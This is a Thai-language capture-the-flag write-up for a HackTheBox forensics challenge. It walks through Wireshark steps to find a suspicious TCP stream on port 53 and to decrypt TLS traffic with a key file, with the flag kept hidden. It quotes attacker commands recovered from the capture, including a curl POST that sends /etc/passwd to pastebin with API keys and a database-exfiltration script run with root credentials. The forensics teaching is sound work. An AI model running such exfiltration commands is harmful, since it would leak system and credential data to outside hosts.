Hi, Can you speak Thai ?

Yes, I can speak Thai.

มา วันนี้เราจะมาทำข้อ Marshal in the Middle หมวด Forensics ระดับ Very easy

Step 1 เปิด wireshark

กดดาวน์โหลดไฟล์ใน hackthebox จากนั้นแตกไฟล์ เลือกไฟล์ที่มีชื่อว่า "chalcap" คลิก 2 ครั้งแล้วใส่รหัส (มีบอกใน hackthebox) ทีนี้ไฟล์ก็จะถูกเปิดใน wireshark

Step 2 จับผิด HTTP

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/8a570256-5024-4136-8906-95f0cd6fc542" />

เมื่อเปิดมา เราจะเห็น HTTP บางตัวที่มีคำขอรับข้อมูลแปลก ๆ 

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/352f5067-07ad-4ebc-8efc-bc9b71aaa86c" />

กดตรง "Hypertext Transfer Protocol" สังเกตจาก Host เราจะเห็นพอร์ตปลายทางคือ 443 แม้ว่านี่จะเป็น HTTP แต่ก็เป็น HTTPS

อธิบาย

- พอร์ต 80 คือ พอร์ตเริ่มต้นสำหรับโปรโตคอล HTTP (Hypertext Transfer Protocol) ใช้สำหรับการรับส่งข้อมูลเว็บที่ไม่ปลอดภัยผ่านอินเทอร์เน็ต

- พอร์ต 443 คือพอร์ตเริ่มต้นสำหรับ HTTPS (Hypertext Transfer Protocol Secure) ซึ่งใช้สำหรับการเชื่อมต่อที่ปลอดภัยและเข้ารหัสข้อมูลระหว่างเว็บเบราว์เซอร์และเว็บไซต์

แสดงว่ามีการเข้ารหัส ฉันเลือก HTTP อันที่น่าสงสัย แล้วคลิกขวา กด Follow เลือก HTTP Steam จากนั้นเลื่อนลงมานิดนึง จะพบเจอกับข้อความดังภาพที่ฉันแปะไว้ใต้ข้อความนี้

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/00be4ca0-b39a-4624-871a-f2479dd108ec" />

และใช่ มันถูกเข้ารหัส สิ่งเหล่านี้เราจะกลับมาสนใจในภายหลัง ไปทำ Step 3 ก่อน

Step 3 DNS

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/5a9ce95a-f018-4c65-b6cd-7902a3769eae" />

มาที่ Statistics เลือก Conversations และไปที่ TCP เราจะสังเกตเห็นชุดแพ็กเกจหนึ่งที่น่าสงสัยที่ในพอร์ตคือ 53 ภายใต้ TCP โดยทั่วไปจะเป็น DNS และ DNS มักจะใช้ UDP แต่ตอนนี้ DNS ใช้ TCP ดังนั้นการที่ DNS ใช้ TCP จึงค่อนข้างน่าสงสัย

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/e1f81194-242d-4c6d-84f0-a4e9b78437bd" />

คลิกขวา เลือก Apply as Filter จากนั้นเลือก Selected แล้วเลือก A ↔ B ในการทำเช่นนี้ เราจะสามารถเห็นแพ็กเกจ TCP ทั้งหมดที่กำลังถูกถ่ายโอนไปยังพอร์ต 53 ที่เราเลือกในการสนทนานั้น

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f48d2be4-7eab-4822-86b3-c748e7c8a83b" />

คลิกขวาที่แพ็กเกจบนสุด กด Follow เลือก TCP Steam

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b936f662-108f-4fe9-b0cb-7c7f567bc96b" />

เราจะไปที่การส่งคำสั่งทั้งหมดจาก Linux กำลังถูกโอนย้ายข้ามสาย
```
curl -d "api_user_key=ed67c1aec48d47270dd002d0baa29814&api_dev_key=bb8aa307a7d4b6073976149b65977bae&api_paste_private=2&api_option=paste&api_paste_code=${pastetext}" 'https://pastebin.com/api/api_post.php
```
ถ้าเราดูจากที่นี่จะสังเกตเห็นว่ามีคำขอ curl ถูกส่งออกไป และดูเหมือนว่าจะถูกส่งเป็นคำขอ POST

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/8792cab7-636b-40e4-894d-b19bcaa6561b" />

ลองดูที่แพ็กเกจบางส่วนที่มีข้อมูลคำขอโพสต์ เราจะใช้ ้http.request.method==POST และเราก็จะได้รับแพ็กเกจ HTTP ทั้งหมดที่ถูกเข้ารหัสไว้ก่อนหน้านี้ ในส่วนของการถอดรหัสแพ็กเกจเหล่านี้ กลับไปดูที่ไฟล์ที่มีชื่อว่า"secrets"

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/11aec5ac-6230-49cf-b9a4-243a071fd708" />

สิ่งที่อยู่ในไฟล์นี้คือ key สามารถใช้ในการถอดรหัสการรับส่งข้อมูล https หรือการรับส่งข้อมูล TSL หรือ SSL

Step 4 TSL

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ecbdc033-1e82-4b02-a6dd-b786c701a391" />

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/27454160-4d8a-4c44-9159-c124b711e449" /

สิ่งที่เราจะทำในลำดับถัดมา คือไปที่ edit เลือก Preferences จากนั้นหา Protocols และกดมัน แล้วเลื่อนหา TSL เมื่อหาเจอแล้วก็กดอัปโหลดไฟล์ที่มีชื่อว่า"secrets" จากนั้นกด OK

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/af31b86c-d8a5-438b-a057-5f630ff48fca" />

ต่อมาเลือกแพ็กเกจสุดท้าย คลิกขวา จากนั้นกด Follow เลือก TCP Steam

<img width="1920" height="1080" alt="ทีเอสแอล" src="https://github.com/user-attachments/assets/5aa636d8-ea3a-493e-a98b-e0fe1936c0d6" />

ทีนี้ก็็เลื่อนหา flag

XXXXX ไม่ใช้ flag นะ คือปิดไว้ จะได้ทำเอง

อธิบายเพิ่มเติม

ประเด็นที่ 1

Q: จากในภาพคำสั่งทั้งหมดจาก Linux กำลังถูกโอนย้ายข้ามสายยังไง สังเกตจากอะไร ?

1.1 สิ่งที่เห็นในเนื้อหา (Follow TCP Stream)

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/bdba076a-7bd9-4087-b3f6-46fba37d8da6" />
```
PING mysql-m1.prod.htb (10.10.20.14)
```
```
root@web-m1:/tmp/.h4x# ./exfildb.sh mysql-m1.prod.htb 3306 root p4ssw0rd dbdump
```
```
curl -d "api_user_key=..." https://pastebin.com/api/api_post.php
```
หมายความว่า

- มี shell prompt (root@web-m1:/tmp/.h4x#) ซึ่งเป็น session ของเครื่อง Linux ฝั่ง remote
  
- มีการรันคำสั่งจริง เช่น ping, cat /etc/passwd, curl
  
- คำสั่งและผลลัพธ์ของมันถูกส่งออกมาใน TCP stream นี้ → หมายความว่า เรากำลังดักดูการสื่อสารระหว่างเครื่องที่รันคำสั่งกับเครื่องที่รับคำสั่ง

1.2 เส้นทางการส่ง (ข้ามสาย)

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/0c28492f-d191-48e9-b907-852eed99e3ab" />
```
Source: 10.10.99.42
Destination: 10.10.20.13
Protocol: TCP
```
หมายความว่า

- เครื่อง 10.10.99.42 กำลังส่งข้อมูลไปยัง 10.10.20.13

- โปรโตคอลที่ใช้คือ TCP

- ภายใน TCP stream มีข้อมูล ASCII ที่เป็น command line ของ Linux

ดังนั้น คำสั่ง Linux ถูกส่งผ่านการเชื่อมต่อ TCP ระหว่างสอง IP นี้

1.3 สิ่งที่บอกว่าเป็นการโอนย้ายคำสั่ง

- มี prompt (root@web-m1:/tmp/.h4x#) แสดงว่าเป็น shell ของ Linux จริง

- มีการพิมพ์คำสั่ง (ping, cat, curl) และผลลัพธ์ หมายถึงคำสั่งถูกส่งและตอบกลับแบบ interactive (interactive แปลว่า ซึ่งมีการสื่อสารระหว่างกัน, สื่อเชิงโต้ตอบ)

- ทั้งหมดอยู่ใน TCP Stream บ่งบอกว่าคำสั่งถูกส่งผ่าน network connection ไม่ใช่แค่ภายในเครื่อง

สรุปสิ่งที่เกิดขึ้น ถ้าตอบแบบยาว ๆ "มีการเปิดเชลล์ระยะไกลจากเครื่องเป้าหมายไปยังเครื่องของผู้โจมตีผ่าน TCP stream" ถ้าตอบแบบสั้น ๆ "มีการรันคำสั่ง Linux ข้ามเครื่อง ผ่านเครือข่าย TCP"

ประเด็นที่ 2

Q: ถูกส่งเป็นคำขอโพสต์คือยังไง

HTTP POST เป็นชนิดของคำขอ (HTTP request) เพื่อส่งข้อมูลจาก client → server
```
pastetext=$(cat /etc/passwd) ; curl -d "api_user_key=ed67c1aec48d47270dd002d0baa29814&api_dev_key=bb8aa307a7d4b6073976149b65977bae&api_paste_private=2&api_option=paste&api_paste_code=${pastetext}" 'https://pastebin.com/api/api_post.php'
```
```
curl -d " ... api_paste_code=${pastetext}" 'https://pastebin.com/api/api_post.php'
```
นี่คือการส่งข้อมูลผ่าน HTTP POST ไปที่ pastebin (ตัว body คือเนื้อหา pastetext ซึ่งเป็น cat /etc/passwd)
